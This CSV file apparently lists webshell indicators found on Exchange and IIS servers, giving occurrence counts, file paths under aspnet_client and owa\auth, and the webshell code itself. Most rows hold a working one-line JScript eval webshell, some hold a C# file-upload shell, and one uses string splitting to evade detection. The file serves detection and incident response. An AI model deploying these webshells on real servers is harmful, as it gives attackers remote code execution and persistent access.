# Occurrences ,Webshell Filename ,WebShell Syntax
46,C:\inetpub\wwwroot\aspnet_client\supp0rt.aspx ,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""orange""],""unsafe"");}</script>"
35,C:\inetpub\wwwroot\aspnet_client\discover.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""Ananas""],""unsafe"");}</script>"
21,C:\inetpub\wwwroot\aspnet_client\shell.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""gttkomomo""],""unsafe"");}</script>"
13,C:\inetpub\wwwroot\aspnet_client\HttpProxy.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""bingo""],""unsafe"");}</script>"
8,C:\inetpub\wwwroot\aspnet_client\0QWYSEXe.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""XOrSeMr3kgWUdFf6""],""unsafe"");}</script>"
7,C:\inetpub\wwwroot\aspnet_client\system_web\error.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""error""],""unsafe"");}</script>"
5,C:\inetpub\wwwroot\aspnet_client\OutlookEN.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""orange""],""unsa""+""fe"");}</script>"
4,C:\inetpub\wwwroot\aspnet_client\load.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""Load""],""unsafe"");}</script>"
3,C:\inetpub\wwwroot\aspnet_client\sol.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""passnew""],""unsafe"");}</script>"
3,C:\inetpub\wwwroot\aspnet_client\aspnettest.aspx,"http://p/dsf"
2,C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\RedirSuiteServerProxy.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""klk123456""],""unsafe"");}</script>"
2,C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\OutlookEN.aspx,"http://g/<script Language=c#"" runat=""server"">void Page_Load(object sender, EventArgs e){if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(""error.aspx""));}}</script>"
2,C:\inetpub\wwwroot\aspnet_client\shellex.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""orange""],""unsafe"");}</script>"
2,C:\inetpub\wwwroot\aspnet_client\error_page.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""mag4""],""unsafe"");}</script>"
1,C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\OutlookEN-RenamedByJoseph.aspx,"http://g/<script Language=c#"" runat=""server"">void Page_Load(object sender, EventArgs e){if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(""error.aspx""));}}</script>"
1,C:\inetpub\wwwroot\aspnet_client\web.config.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""Web.Config.aspx@2021""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\t.aspx,"http://a/"
1,C:\inetpub\wwwroot\aspnet_client\system_web\ZUh4gB23.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\zuFLEONY.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\ZKS7YinF.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\ZI1DzdL8.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\zDuo6yIe.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Z4lcVesd.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\YZ3Pn1yB.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""7gHQRih3fnam""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\ynEtrkve.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\ykDKUazY.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\yFu5T8JV.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\yDbVCsdf.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\y9w2YodG.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Y9mkV7wy.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\y571gwM9.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\y2Co7tBi.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Y25XePkg.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\XYMUysAZ.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\XRUS47TQ.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\XJrBqeul.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\XhOHA2Z1.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\x638MRKj.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Wz2jC6af.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\wWgH5MDT.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\WUlmdtJ0.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\WRiXfvxH.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\WcIORPdj.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\W4jTvk16.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""EU2JscRCQnpa""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\vmR2GgN8.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Vm93D0eh.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\VkvLJFXT.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Vd0fUyxN.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Vc0M5GiJ.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\v6s1wCQI.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\V4bLvugt.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\UucjG2Ma.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\USBD9Vtl.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\u5Gl1PpV.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\u2O4msdo.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\u1M6CqNd.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Tx2tWFMb.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\tWPuZyke.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\TwP5azFy.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\TVzaArBP.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\TvS1CXVF.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\tUF6d7RV.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\tSF8uZmv.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""fdvre6YOy2WI""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\tS4NTqlB.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""ZvDUW9RxAnqu""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\tMQhi8zV.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\sZREDmSe.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\sZDUQOqI.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\sYG9nrla.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\svrTeWOP.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\Sq5hL26r.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\sohEbZ9D.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\SNaxtjQ8.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\sLakuBgM.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\sKPt5ZmI.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\sKcUOiDk.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\SIDHcThr.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\sep06rVH.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\SebmlUrd.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\SBx3mpCE.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\rYa8Rnhx.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\rqmVa96L.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\rP0WODnv.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\rOdA2hzS.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\rlQSgsBi.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\R5IgMiCX.aspx,"http://f/f34fji34r209ur29ur92r"
1,C:\inetpub\wwwroot\aspnet_client\system_web\R0ZKTDyW.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\qZLybach.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\qVFCDhHr.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\qNKd61vE.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\qmDaO5Ni.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
1,C:\inetpub\wwwroot\aspnet_client\system_web\QLrB7JjU.aspx,"http://f/<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""NO9BxmCXw0JE""],""unsafe"");}</script>"
